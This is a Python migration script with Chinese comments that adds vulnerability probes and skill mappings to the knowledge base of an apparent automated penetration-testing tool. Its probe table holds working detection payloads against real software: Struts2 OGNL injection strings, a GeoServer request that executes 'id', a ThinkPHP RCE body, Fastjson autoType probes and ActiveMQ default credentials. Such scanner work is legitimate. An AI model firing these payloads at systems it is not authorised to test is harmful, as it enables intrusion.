"""
One-shot migration: 给 kb_data/*.json 增加 probes 和 dispatch_skill 字段，
exploit_steps 标记为 deprecated（添加 _exploit_steps_deprecated 标记）。

运行：python -m backend.knowledge._migrate_kb_add_probes
脚本幂等：已有 probes 字段的条目跳过。
"""
from __future__ import annotations

import json
from pathlib import Path

KB_DIR = Path(__file__).parent / "kb_data"

DISPATCH_SKILL_MAP: dict[str, str] = {
    "fastjson_1247": "fastjson_rce",
    "fastjson_1224": "fastjson_rce",
    "weblogic_cve2023_21839": "weblogic_jndi_rce",
    "struts2_s2057": "struts2_ognl_rce",
    "struts2_s2045": "struts2_ognl_rce",
    "shiro_cve2016_4437": "shiro_rce",
    "flask_ssti": "flask_ssti_rce",
    "geoserver_cve2024_36401": "geoserver_rce",
    "php_fpm_cve2019_11043": "php_fpm_rce",
    "jboss_cve2017_7504": "jboss_deserial_rce",
    "thinkphp_5023": "thinkphp_rce",
    "activemq_cve2022_41678": "activemq_rce",
    "django_cve2022_34265": "django_sqli",
    "tomcat_cve2017_12615": "tomcat_exploit",
    "tomcat8_weak_password": "tomcat_exploit",
    "directory_listing_exploit": "directory_discovery",
    "backup_file_exploit": "directory_discovery",
}

PROBES_MAP: dict[str, list[dict]] = {
    "fastjson_1247": [
        {
            "id": "fastjson_atype_probe",
            "description": "POST @type=java.lang.Class，观察响应错误信息",
            "method": "POST",
            "path": "/",
            "headers": {"Content-Type": "application/json"},
            "body": "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}",
            "timeout": 10,
            "success_signs": {
                "body_contains_any": [
                    "fastjson", "JSONException", "JdbcRowSetImpl",
                    "ParseException", "autoTypeSupport"
                ],
            },
            "confidence": 0.85,
        }
    ],
    "fastjson_1224": [
        {
            "id": "fastjson_atype_probe",
            "description": "POST @type=java.lang.Class，观察响应错误信息",
            "method": "POST",
            "path": "/",
            "headers": {"Content-Type": "application/json"},
            "body": "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}",
            "timeout": 10,
            "success_signs": {
                "body_contains_any": [
                    "fastjson", "JSONException", "JdbcRowSetImpl",
                    "ParseException", "autoTypeSupport"
                ],
            },
            "confidence": 0.85,
        }
    ],
    "weblogic_cve2023_21839": [
        {
            "id": "weblogic_t3_banner",
            "description": "T3 协议握手探测：发送 t3 标识符确认 WebLogic 服务",
            "method": "RAW_TCP",
            "ports": [7001, 7002],
            "payload_hex": "74332031322e322e310a41533a323535",
            "timeout": 8,
            "success_signs": {
                "response_contains_any": ["HELO", "WebLogic", "AS:"],
            },
            "confidence": 0.7,
        },
        {
            "id": "weblogic_console_probe",
            "description": "访问 /console/login/LoginForm.jsp 探测控制台",
            "method": "GET",
            "path": "/console/login/LoginForm.jsp",
            "ports": [7001, 7002],
            "timeout": 8,
            "success_signs": {
                "status_codes": [200],
                "body_contains_any": ["WebLogic Server Administration Console", "weblogic"],
            },
            "confidence": 0.6,
        },
    ],
    "struts2_s2045": [
        {
            "id": "s2045_ognl_header_probe",
            "description": "Content-Type 注入 OGNL，观察响应头回显",
            "method": "GET",
            "path": "/",
            "headers": {
                "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Probe',233*233))}.multipart/form-data"
            },
            "timeout": 10,
            "success_signs": {
                "header_contains": [["X-Probe", "54289"]],
            },
            "confidence": 0.95,
        }
    ],
    "struts2_s2057": [
        {
            "id": "s2057_ognl_url_probe",
            "description": "URL 路径注入 OGNL，观察 alert 标识回显",
            "method": "GET",
            "path": "/${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#a=233*233).(@org.apache.struts2.ServletActionContext@getResponse().addHeader('X-Probe',#a))}/actionChain1.action",
            "timeout": 10,
            "success_signs": {
                "header_contains": [["X-Probe", "54289"]],
            },
            "confidence": 0.95,
        }
    ],
    "shiro_cve2016_4437": [
        {
            "id": "shiro_rememberme_probe",
            "description": "GET / 观察 rememberMe=deleteMe 响应头",
            "method": "GET",
            "path": "/",
            "headers": {"Cookie": "rememberMe=test"},
            "timeout": 8,
            "success_signs": {
                "header_contains": [["Set-Cookie", "rememberMe=deleteMe"]],
            },
            "confidence": 0.95,
        }
    ],
    "flask_ssti": [
        {
            "id": "ssti_math_probe",
            "description": "GET ?name={{7*7}} 观察响应是否计算 49",
            "method": "GET",
            "path": "/?name={{7*7}}",
            "timeout": 8,
            "success_signs": {
                "body_contains_any": ["49", "Hello 49"],
            },
            "confidence": 0.85,
        },
        {
            "id": "ssti_concat_probe",
            "description": "GET ?name={{7*'7'}} 区分 Jinja2 vs 其他模板",
            "method": "GET",
            "path": "/?name={{7*'7'}}",
            "timeout": 8,
            "success_signs": {
                "body_contains_any": ["7777777"],
            },
            "confidence": 0.95,
        },
    ],
    "geoserver_cve2024_36401": [
        {
            "id": "geoserver_capabilities_probe",
            "description": "确认 GeoServer 服务可达",
            "method": "GET",
            "path": "/geoserver/ows?service=wms&version=1.3.0&request=GetCapabilities",
            "timeout": 10,
            "success_signs": {
                "status_codes": [200],
                "body_contains_any": ["GeoServer", "WMS_Capabilities", "wms:"],
            },
            "confidence": 0.6,
        },
        {
            "id": "geoserver_eval_probe",
            "description": "exec 注入 id，观察响应是否含命令结果或 ClassCastException",
            "method": "GET",
            "path": "/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')",
            "timeout": 10,
            "success_signs": {
                "body_contains_any": [
                    "uid=", "ClassCastException",
                    "java.lang.Runtime", "Process",
                ],
            },
            "confidence": 0.9,
        },
    ],
    "php_fpm_cve2019_11043": [
        {
            "id": "fpm_502_probe",
            "description": "URL 注入 %0a，观察是否 502/500（PHP-FPM 缓冲区溢出特征）",
            "method": "GET",
            "path": "/index.php/%0A",
            "timeout": 8,
            "success_signs": {
                "status_codes": [500, 502, 504],
            },
            "confidence": 0.7,
        }
    ],
    "jboss_cve2017_7504": [
        {
            "id": "jboss_jmxinvoker_probe",
            "description": "GET /invoker/JMXInvokerServlet，观察 java-serialized-object Content-Type",
            "method": "GET",
            "path": "/invoker/JMXInvokerServlet",
            "timeout": 8,
            "success_signs": {
                "header_contains": [["Content-Type", "application/x-java-serialized-object"]],
            },
            "confidence": 0.9,
        }
    ],
    "thinkphp_5023": [
        {
            "id": "thinkphp_method_probe",
            "description": "POST _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
            "method": "POST",
            "path": "/index.php?s=captcha",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
            "timeout": 10,
            "success_signs": {
                "body_contains_any": ["phpinfo()", "PHP Version", "<title>phpinfo()"],
            },
            "confidence": 0.95,
        }
    ],
    "activemq_cve2022_41678": [
        {
            "id": "activemq_admin_probe",
            "description": "GET /admin/ 默认凭据探测",
            "method": "GET",
            "path": "/admin/",
            "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="},
            "timeout": 10,
            "success_signs": {
                "status_codes": [200],
                "body_contains_any": ["ActiveMQ", "Apache ActiveMQ"],
            },
            "confidence": 0.85,
        },
        {
            "id": "activemq_jolokia_probe",
            "description": "GET /api/jolokia/list 验证 Jolokia 接口可达",
            "method": "GET",
            "path": "/api/jolokia/list",
            "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="},
            "timeout": 10,
            "success_signs": {
                "status_codes": [200],
                "body_contains_any": ["MBean", "org.apache.activemq", "value"],
            },
            "confidence": 0.95,
        },
    ],
    "django_cve2022_34265": [
        {
            "id": "django_admin_probe",
            "description": "GET /admin/ 探测 Django 后台",
            "method": "GET",
            "path": "/admin/",
            "timeout": 8,
            "success_signs": {
                "body_contains_any": [
                    "Django administration", "Log in | Django site admin",
                    "csrfmiddlewaretoken",
                ],
            },
            "confidence": 0.7,
        }
    ],
    "tomcat_cve2017_12615": [
        {
            "id": "tomcat_put_probe",
            "description": "OPTIONS / 检查是否允许 PUT 方法",
            "method": "OPTIONS",
            "path": "/",
            "timeout": 8,
            "success_signs": {
                "header_contains": [["Allow", "PUT"]],
            },
            "confidence": 0.9,
        },
        {
            "id": "tomcat_banner_probe",
            "description": "GET / 检查 Tomcat banner",
            "method": "GET",
            "path": "/",
            "timeout": 8,
            "success_signs": {
                "header_contains": [["Server", "Apache-Coyote"]],
                "body_contains_any": ["Apache Tomcat"],
            },
            "confidence": 0.5,
        },
    ],
    "tomcat8_weak_password": [
        {
            "id": "tomcat_manager_probe",
            "description": "GET /manager/html 探测 Tomcat 管理界面",
            "method": "GET",
            "path": "/manager/html",
            "timeout": 8,
            "success_signs": {
                "status_codes": [401],
                "header_contains": [["WWW-Authenticate", "Basic"]],
            },
            "confidence": 0.85,
        }
    ],
    "directory_listing_exploit": [
        {
            "id": "dir_listing_probe",
            "description": "GET / 检查目录列出特征",
            "method": "GET",
            "path": "/",
            "timeout": 8,
            "success_signs": {
                "body_contains_any": [
                    "Index of /", "<title>Directory listing for",
                    "Parent Directory", "<h1>Index of",
                ],
            },
            "confidence": 0.95,
        }
    ],
    "backup_file_exploit": [
        {
            "id": "backup_zip_probe",
            "description": "GET /backup.zip 探测常见备份文件名",
            "method": "GET",
            "path": "/backup.zip",
            "timeout": 6,
            "success_signs": {
                "status_codes": [200],
                "header_contains": [["Content-Type", "application/zip"]],
            },
            "confidence": 0.95,
        },
        {
            "id": "backup_sql_probe",
            "description": "GET /backup.sql 探测 SQL 备份",
            "method": "GET",
            "path": "/backup.sql",
            "timeout": 6,
            "success_signs": {
                "status_codes": [200],
                "body_contains_any": ["INSERT INTO", "CREATE TABLE", "DROP TABLE"],
            },
            "confidence": 0.95,
        },
    ],
}


def migrate_one(json_file: Path) -> bool:
    """返回 True 表示文件被修改写回。"""
    try:
        data = json.loads(json_file.read_text(encoding="utf-8"))
    except Exception as e:
        print(f"  [SKIP] 无法解析 {json_file.name}: {e}")
        return False

    vuln_id = data.get("vuln_id", "")
    if not vuln_id:
        return False

    changed = False

    if "dispatch_skill" not in data:
        skill_id = DISPATCH_SKILL_MAP.get(vuln_id, "")
        if skill_id:
            data["dispatch_skill"] = skill_id
            changed = True

    if "probes" not in data:
        probes = PROBES_MAP.get(vuln_id, [])
        if probes:
            data["probes"] = probes
            changed = True

    if data.get("exploit_steps") and "_exploit_steps_deprecated" not in data:
        data["_exploit_steps_deprecated"] = True
        data["_exploit_steps_note"] = (
            "DEPRECATED: 利用步骤已迁移到对应 Skill YAML "
            "(backend/skills/<category>/<name>.yaml)。"
            "保留此字段仅用于向后兼容旧的 KnowledgeRetriever LLM 检索路径。"
        )
        changed = True

    if changed:
        ordered: dict = {}
        for key in ("vuln_id", "dispatch_skill", "description", "category"):
            if key in data:
                ordered[key] = data.pop(key)

        rest_keys = list(data.keys())
        if "detection_method" in rest_keys and "probes" in rest_keys:
            rest_keys.remove("probes")
            idx = rest_keys.index("detection_method") + 1
            rest_keys.insert(idx, "probes")
        for key in rest_keys:
            ordered[key] = data[key]

        json_file.write_text(
            json.dumps(ordered, ensure_ascii=False, indent=2),
            encoding="utf-8",
        )
        return True

    return False


def main() -> None:
    if not KB_DIR.exists():
        print(f"[!] kb_data 目录不存在: {KB_DIR}")
        return

    files = sorted(KB_DIR.glob("*.json"))
    print(f"[+] 处理 {len(files)} 个 KB 文件...")
    modified = 0
    for f in files:
        if migrate_one(f):
            modified += 1
            print(f"  [OK] 已更新 {f.name}")
        else:
            print(f"  [--] 未变更 {f.name}")
    print(f"[+] 完成：{modified}/{len(files)} 个文件被更新")


if __name__ == "__main__":
    main()
